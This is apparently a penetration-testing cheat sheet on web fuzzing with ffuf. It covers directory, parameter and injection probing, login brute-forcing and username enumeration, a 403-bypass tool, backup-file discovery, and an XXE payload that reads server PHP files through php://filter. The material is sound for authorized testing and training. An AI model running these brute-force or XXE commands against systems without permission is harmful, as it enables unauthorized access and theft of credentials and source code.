# Fuzzing

The term fuzzing refers to a testing technique that sends various types of user input to a given interface to study how it would react. In the web case, it is to see valid routes or, failing that, to observe some different behavior.

## ffuf

### Essentials

```bash
# Essentials:
ffuf -c -w <WORDLIST> -u <URL>/FUZZ -t 50 # Simple fuzzing with threads.
ffuf -c -r -w <WORDLIST> -u <URL>/FUZZ # Redirects with the "-r" parameter.
ffuf -c -w <WORDLIST>:PALABRA -w <WORDLIST>:EXTENSION -u <URL>/PALABRA.EXTENSION -mc all # Double fuzzer
ffuf -fs 233 -c -w /opt/SecLists/Discovery/Web-Content/common.txt -u '<URL>/FUZZ' -mc all # Filter by size, not by status code (ideal for pages where the home page gives us a 404 code)
ffuf -c -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt -u <URL>/indexFUZZ -mc all # Fuzzing of web extensions.
ffuf -c -w <WORDLIST> -u <URL>/FUZZ -mc all # Search by ALL codes.
ffuf -w <WORDLIST> -u <URL>/FUZZ -recursion -recursion-depth 1 -e .php -v # Recursive (recursion-depth 1 = depth up to 1 more path.
ffuf -c -w <WORDLIST> -u <URL>/FUZZ -H 'Cookie: <COOKIE>' # Header (Example with a cookie)
ffuf -c -w <WORDLIST> -u '<URL>/FFUF' -x socks5://127.0.0.1:1080 # Proxy
```

{% hint style="danger" %}
Always prioritize by the following filters: **-fs**, **-fw**, **-fc**, etc.
{% endhint %}

### Parameters or data (GET/POST)

```bash
ffuf -c -w $wordlist_params -u '<URL>/?FUZZ=key'
ffuf -c -w $wordlist_params -u <URL>/<PATH> -X POST -d 'FUZZ=key'
# Test POST requests but with GET content (useful for endpoint APIs that need a GET type parameter through POST):
ffuf -c -w $wordlist_params -u '<URL>/?FUZZ=key' -X POST
# Numeric values (the "-" will take the stdout from the first command):
seq 0 255 | ffuf -c -w - -u '<URL>/?id=FUZZ' -mc all
# Fuzzing with multiple wordlists (recommended for LFI):
ffuf -c -w $wordlist_params:PARAM -w values.txt:VAL -u "http://example.org/?PARAM=VAL"
```

### Injections

```bash
# Injections:
# GET:
ffuf -c -w /opt/SecLists/Fuzzing/special-chars.txt -u "<URL>/?asd=FUZZ" -mc all
ffuf -c -w /opt/SecLists/Fuzzing/special-chars.txt -u "<URL>/?asd=FUZZFUZZ" -mc all
ffuf -c -w /opt/SecLists/Fuzzing/special-chars.txt -u "<URL>/?asd=FUZZ " -mc all
ffuf -c -w /opt/SecLists/Fuzzing/special-chars.txt -u "<URL>/?asd=FUZZ FUZZ" -mc all
# POST:
ffuf -c -w /opt/SecLists/Fuzzing/special-chars.txt -u "<URL>" -d "<KEY>=FUZZ" -H "<CONTENTTYPE>" -mc all
ffuf -c -w /opt/SecLists/Fuzzing/special-chars.txt -u "<URL>" -d "<KEY>=FUZZFUZZ" -H "<CONTENTTYPE>" -mc all
# POST (show only headers):
ffuf -c -w /opt/SecLists/Fuzzing/special-chars.txt -u "<URL>" -d "<KEY>=FUZZ" -H "<CONTENTTYPE>" -mc all -v # Important the "-v", it can reveal different headers that we would not see with the naked eye.
for char in $(cat /opt/SecLists/Fuzzing/special-chars.txt); do echo "[+] Payload: $char"; curl '<URL>' -d "username=$char" -i; done # We can also use the "-v".
# Double special chars:
for char1 in $(cat /opt/SecLists/Fuzzing/special-chars.txt); do for char2 in $(cat /opt/SecLists/Fuzzing/special-chars.txt); do echo "[+] Payload: $char1$char2"; curl '<URL>' -d "username=$char" -i; done; done # We can also use the "-v".
# Double special chars (Only show status code):
for char1 in $(cat /opt/SecLists/Fuzzing/special-chars.txt); do for char2 in $(cat /opt/SecLists/Fuzzing/special-chars.txt
); do echo -n "[+] Payload: $char1$char2 : "; curl "<URL>" -o /dev/null -w "%{http_code}"; echo; done; done
```

{% hint style="danger" %}
With ffuf, it is very important to include the Content-Type header. Examples: `Content-Type: application/json` (JSON), `application/x-wwww-form-urlencoded` (PHP)
{% endhint %}

```bash
# Bruteforce
ffuf -c -w <WORDLIST> -X POST -d '<DATA>' -H '<HEADER>' -u <URL>
ffuf -c -w <WORDLIST> -X POST -d "username=<USER>&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -H "<COOKIE>" -u <URL>
ffuf -c -w <USERS WORDLIST>:W1,<WORDLIST>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <URL>
ffuf -c -w /opt/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u <URL> -mr "username already exists"
```

{% hint style="danger" %}
Ask yourself the following question: **How does the framework handle** "`!#$%&/()`" **(special) chararcters?**
{% endhint %}

## 403 fuzzing

Tool to bypass 403 responses.

{% embed url="https://github.com/channyein1337/403-bypass" %}

```bash
git clone https://github.com/channyein1337/403-bypass
cd 403-bypass
python3 403-bypass.py -u '<URL>' -p '<PATH>'
python3 403-bypass.py -u 'http://10.10.10.10' -p 'private/index.php' # Example
```

## **Tips**

#### Change the parameter type to an array

```bash
http://example.com/index.php?test[]
```

In this case, the test parameter will be of type array. This is ideal to see if an error occurs.

#### 403 Forbidden

When obtaining a Forbidden (403) in the status code of the server-side response, it is recommended to continue investigating, since in spite of showing such response, we can continue enumerating directories and files within that directory, where after finding valid resources we see that these are visible from the web. To have a practical case, let's suppose that we have a directory /design that returns a Forbidden (403). One thing we can do is to set up a double Payload enumeration from ffuf in order to discover existing resources under that directory.

#### **Backups checking**

Web servers may keep backups of some files. Once you have found all the files, search for interesting file backups. The most common variants for naming a backup are:

```
file.ext~, #file.ext#, ~file.ext, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp, file.old
```

We can use the bfac tool to automate this search:

{% embed url="https://github.com/mazen160/bfac" %}

```bash
bfac --url http://example.com/test.php --level 2
```

#### File or directory name format

When searching for files or directories, it is very important to look at the name format of one of them. For example, let's suppose that through an XXE we manage to include .php files in base64 and we observe the following content of the index.php:

```php
<?php
include_once('../Autoload.php');
include_once('../Route.php');
include_once('../Output.php');
include_once('../View.php');

Route::load();
Route::run();
?>
```

We note that it is using the Laravel framework (by the "Route::" structure) and we see that the format of the file names begin with the letter in uppercase, it is not all lowercase. In that case, we could modify the wordlist as follows:

```bash
sed -e "s/\b\(.\)/\u\1/g" <WORDLIST>
```

And now, we can fuzz all the directories looking for files using the modified wordlist:

```bash
ffuf -c -w wordlist.txt -X POST -u 'http://10.10.211.87/api/products?format=xml' -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../routes/FUZZ.php"> ]><data><productId>&xxe;</productId></data>'
```
